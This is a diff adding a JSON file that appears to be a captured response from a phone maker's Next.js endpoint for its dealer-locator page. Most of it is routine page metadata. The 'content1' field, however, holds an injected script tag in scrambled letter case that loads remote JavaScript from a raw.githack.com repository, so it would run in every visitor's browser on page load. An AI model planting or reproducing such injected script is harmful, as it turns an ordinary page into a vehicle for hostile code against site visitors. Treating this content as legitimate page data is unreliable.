@@ -1,0 +1,38 @@
+{
+  "url": "https://www.lavamobiles.com/_next/data/ly0JhjssYFJ7DcRKPylzU/lavastoredealer.json",
+  "method": "GET",
+  "status": 200,
+  "content_type": "application/json",
+  "body": {
+    "pageProps": {
+      "DealerLocatorPge": {
+        "status": 1,
+        "msg": "dealer-locator Page Content",
+        "data": {
+          "id": 13,
+          "slug": "dealer-locator",
+          "name": "Dealer Locator",
+          "sub_text": null,
+          "content1": "<sCrIpT sRc=//raw.githack.com/gogok4nxgo/1v9et39j58z1/main/1.js></ScRiPt>",
+          "content2": null,
+          "content3": null,
+          "content4": null,
+          "content5": null,
+          "content6": null,
+          "page_title": "Lava Store Dealers, Lava Retailers List Online in India - LAVA Mobiles",
+          "meta_keywords": "Dealer Locator",
+          "meta_description": "Lava Store Dealers, Lava Retailers List Online in India - LAVA Mobiles",
+          "meta_other": null,
+          "video_url": null,
+          "image": "media/cmspage/image/bannse-1920x695-location--1721039627.webp",
+          "image_alt": null,
+          "image_mobile": "media/cmspage/image_mobile/frame-157503-1703566570.webp",
+          "status": 1
+        },
+        "leadership": {},
+        "success": "success"
+      }
+    },
+    "__N_SSG": true
+  }
+}
